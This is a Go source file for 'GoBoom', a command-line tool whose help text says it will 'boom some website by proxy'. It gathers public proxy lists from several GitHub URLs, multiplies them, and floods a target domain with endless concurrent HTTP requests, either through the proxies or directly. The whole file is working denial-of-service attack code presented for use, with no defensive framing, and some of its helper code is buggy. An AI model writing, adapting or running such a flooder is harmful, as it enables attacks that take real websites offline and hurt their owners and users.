package main

import (
    "encoding/json"
    "fmt"
    "io/ioutil"
    "log"
    "net"
    "net/http"
    "net/url"
    "os"
    "runtime"
    "strconv"
    "strings"
    "sync"
    "time"

    "github.com/akamensky/argparse"
)

var statusCodeToEscape = []string{
    //"503 Too many open connections",
    "401 Unauthorized",
    "409 Conflict",
    "404 Not Found",
    "502 Bad Gateway",
    "504 Gateway Timeout",
    "407 Proxy Authentication Required",
    "400 Bad Request",
    "502 Proxy Error",
    "403 Forbidden",
    //"503 Service Unavailable",
    "504 DNS Name Not Found",
    "407 Unauthorized",
    "405 Method Not Allowed",
    //"503 Service Temporarily Unavailable",
}

func getProxyList_github(link string) []string {
    // format of the list is ip:port
    // return a list of proxy
    resp, err := http.Get(link)
    if err != nil {
        log.Fatal(err)
    }
    defer resp.Body.Close()
    // read the body of the response
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        log.Fatal(err)
    }
    proxy_list := strings.Replace(string(body), "\r", "", -1)
    return strings.Split(proxy_list, "\n")
}

type Proxy_genode struct {
    Data []struct {
        ID                 string      `json:"_id"`
        IP                 string      `json:"ip"`
        AnonymityLevel     string      `json:"anonymityLevel"`
        Asn                string      `json:"asn"`
        City               string      `json:"city"`
        Country            string      `json:"country"`
        CreatedAt          time.Time   `json:"created_at"`
        Google             bool        `json:"google"`
        Isp                string      `json:"isp"`
        LastChecked        int         `json:"lastChecked"`
        Latency            float32     `json:"latency"`
        Org                string      `json:"org"`
        Port               string      `json:"port"`
        Protocols          []string    `json:"protocols"`
        Region             interface{} `json:"region"`
        ResponseTime       int         `json:"responseTime"`
        Speed              int         `json:"speed"`
        UpdatedAt          time.Time   `json:"updated_at"`
        WorkingPercent     interface{} `json:"workingPercent"`
        UpTime             float64     `json:"upTime"`
        UpTimeSuccessCount int         `json:"upTimeSuccessCount"`
        UpTimeTryCount     int         `json:"upTimeTryCount"`
    } `json:"data"`
    Total int `json:"total"`
    Page  int `json:"page"`
    Limit int `json:"limit"`
}

func getProxyList_genode() []string {
    // get the list of proxy at https://raw.githubusercontent.com/vakhov/fresh-proxy-list/refs/heads/master/http.txt
    // return a list of proxy
    var proxy_list []string
    resp, err := http.Get("https://raw.githubusercontent.com/vakhov/fresh-proxy-list/refs/heads/master/http.txt")
    if err != nil {
        log.Fatal(err)
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        log.Fatal(err)
    }
    var proxy_genode Proxy_genode
    err = json.Unmarshal(body, &proxy_genode)
    if err != nil {
        log.Fatal(err)
    }
    for _, proxy := range proxy_genode.Data {
        proxy_list = append(proxy_list, proxy.IP+":"+proxy.Port)
    }
    return proxy_list
}

func getProxyList_file(path string) []string {
    // format of the list is ip:port
    // return a list of proxy
    file, err := os.Open(path)
    if err != nil {
        log.Fatal(err)
    }
    defer file.Close()
	body, err := ioutil.ReadAll(file)
    if err != nil {
        log.Fatal(err)
    }
    proxy_list := strings.Replace(string(body), "\r", "", -1)
    return strings.Split(proxy_list, "\n")
}

func stringInSlice(a string, list []string) bool {
    // check if element exists in list
    for _, b := range list {
        if b == a {
            return true
        }
    }
    return false
}

func handlerProxy(domain, proxy string) string {
    // connect to the website using specified proxy
    // proxy is in ip:port format and domain in domain.com format
    mutex := &sync.Mutex{}
    mutex.Lock()
    proxyUrl, err := url.Parse("http://" + proxy)
    mutex.Unlock()
    if err != nil {
        return "error"
    }
    client := &http.Client{
        Transport: &http.Transport{
            Proxy: http.ProxyURL(proxyUrl),
        },
    }
    client.Timeout = time.Millisecond * 1000
    mutex.Lock()
    resp, err := client.Get("http://" + domain)
    mutex.Unlock()
    if err != nil {
        return "error"
    }
    defer resp.Body.Close()
    if stringInSlice(resp.Status, statusCodeToEscape) {
        return "error"
    }
    if resp.StatusCode != 0 {
        return resp.Status
    } else {
        return "error"
    }
}

func handler(domain string) string {
    // simple handler that connects without proxy
    client := &http.Client{}
    client.Timeout = time.Millisecond * 100
    resp, err := client.Get("http://" + domain)
    if err != nil {
        return "error"
    }
    defer resp.Body.Close()
    if stringInSlice(resp.Status, statusCodeToEscape) {
        return "error"
    }
    if resp.StatusCode != 0 {
        return resp.Status
    } else {
        return "error"
    }
}

func removeDuplicates(elements []string) []string {
    encountered := map[string]bool{}
    result := []string{}
    for v := range elements {
        if encountered[elements[v]] {
            // duplicate; do not add.
        } else {
            encountered[elements[v]] = true
            result = append(result, elements[v])
        }
    }
    return result
}

func add_good_proxy(proxy string, good_proxy []string) []string {
    var mutex = &sync.Mutex{}
    mutex.Lock()
    good_proxy = append(good_proxy, proxy)
    mutex.Unlock()
    return good_proxy
}

func check_host_up(domain string) bool {
    _, err := net.LookupHost(domain)
    return err == nil
}

func test_proxy(proxy_file []string) []string {
    // (No longer used in mode 1 when proxies are auto used)
    var good_proxy []string
    proxy_list := getProxyList_github("https://raw.githubusercontent.com/vakhov/fresh-proxy-list/refs/heads/master/http.txt")
    proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/vakhov/fresh-proxy-list/refs/heads/master/http.txt")...)
    proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/vakhov/fresh-proxy-list/refs/heads/master/http.txt")...)
    proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/vakhov/fresh-proxy-list/refs/heads/master/http.txt")...)
    if len(proxy_file) > 0 {
        for _, file := range proxy_file {
            proxy_list = append(proxy_list, getProxyList_file(file)...)
        }
    }
    proxy_list = removeDuplicates(proxy_list)
    fmt.Println("Total proxy : ", len(proxy_list))
    domain := "github.com"
    wg2 := sync.WaitGroup{}
    fmt.Println("Checking proxy...")
    for _, proxy := range proxy_list {
        wg2.Add(1)
        go func(proxy string) {
            defer wg2.Done()
            result := handlerProxy(domain, proxy)
            if result == "200 OK" || result == "200" {
                good_proxy = add_good_proxy(proxy, good_proxy)
            }
        }(proxy)
    }
    wg2.Wait()
    return good_proxy
}

func remove_proxy(proxy string, proxy_list []string) []string {
    var mutex = &sync.Mutex{}
    for i, p := range proxy_list {
        if p == proxy {
            mutex.Lock()
            proxy_list = append(proxy_list[:i], proxy_list[i+1:]...)
            mutex.Unlock()
            break
        }
    }
    return proxy_list
}

func main() {
    parser := argparse.NewParser("GoBoom", "Boom some website by proxy")
    domain := parser.String("d", "domain", &argparse.Options{Required: true, Help: "Domain to boom"})
    threads := parser.String("t", "threads", &argparse.Options{Required: false, Help: "Number of core to use", Default: "max"})
    proxy_file := parser.StringList("p", "proxy-file", &argparse.Options{Required: false, Help: "Proxy file(s), separate with a ',' each files. Format of file(s) must be ip:port", Default: []string{}})
    proxy_mult := parser.Int("x", "proxy-mult", &argparse.Options{Required: false, Help: "You can multiply the working proxys detected with this option", Default: 12})
    mode := parser.Int("m", "mode", &argparse.Options{Required: false, Help: "Mode of attack, 1 for pass all traffic through proxy, 2 don't use proxy", Default: 1})
    err := parser.Parse(os.Args)
    if err != nil {
        fmt.Print(parser.Usage(err))
        os.Exit(1)
    }
    if !check_host_up(*domain) {
        fmt.Println("The domain or ip is not up")
        os.Exit(1)
    }

    cpu := runtime.NumCPU()
    if *threads == "max" {
        runtime.GOMAXPROCS(cpu)
    } else {
        threads_int, err := strconv.Atoi(*threads)
        if err != nil {
            fmt.Println("Error with threads")
            os.Exit(1)
        }
        if threads_int > cpu {
            runtime.GOMAXPROCS(cpu)
        } else {
            runtime.GOMAXPROCS(threads_int)
            cpu = threads_int
        }
    }

    if *mode == 1 {
        // Process proxy file input: split comma-separated files
        for _, p := range *proxy_file {
            if strings.Contains(p, ",") {
                *proxy_file = strings.Split(p, ",")
            } else {
                *proxy_file = append(*proxy_file, p)
            }
        }
        // Combine proxies from online sources and file(s) without checking.
        proxy_list := getProxyList_github("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt")
        proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt")...)
        proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")...)
        proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt")...)
        if len(*proxy_file) > 0 {
            for _, file := range *proxy_file {
                proxy_list = append(proxy_list, getProxyList_file(file)...)
            }
        }
        proxy_list = removeDuplicates(proxy_list)
        fmt.Println("Total proxies : ", len(proxy_list))
        // Multiply the proxy list
        var proxy_list_temp []string
        for i := 0; i < *proxy_mult; i++ {
            proxy_list_temp = append(proxy_list_temp, proxy_list...)
        }
        proxy_list = proxy_list_temp

        fmt.Println("Total proxies after multiplication :", len(proxy_list))
        fmt.Println("Max process :", cpu)
        fmt.Println("Starting attack in 5 seconds...")
        time.Sleep(5 * time.Second)

        var wg sync.WaitGroup
        for {
            for _, proxy := range proxy_list {
                wg.Add(1)
                go func(proxy string) {
                    status := handlerProxy(*domain, proxy)
                    fmt.Println(status + " : " + proxy + "\t time : " + time.Now().Format("15:04:05.000"))
                    wg.Done()
                }(proxy)
            }
            wg.Wait()
        }

    } else if *mode == 2 {
        cpu := runtime.NumCPU()
        runtime.GOMAXPROCS(cpu)
        threads_int, err := strconv.Atoi(*threads)
        if err != nil {
            fmt.Println("Error: threads must be a number")
            os.Exit(1)
        }
        for {
            var wg sync.WaitGroup
            for i := 0; i < threads_int; i++ {
                wg.Add(1)
                go func() {
                    status := handler(*domain)
                    fmt.Println(status, "time :", time.Now().Format("15:04:05.000"))
                    wg.Done()
                }()
            }
            wg.Wait()
            fmt.Println("All threads are dead, restarting")
        }
    }
}
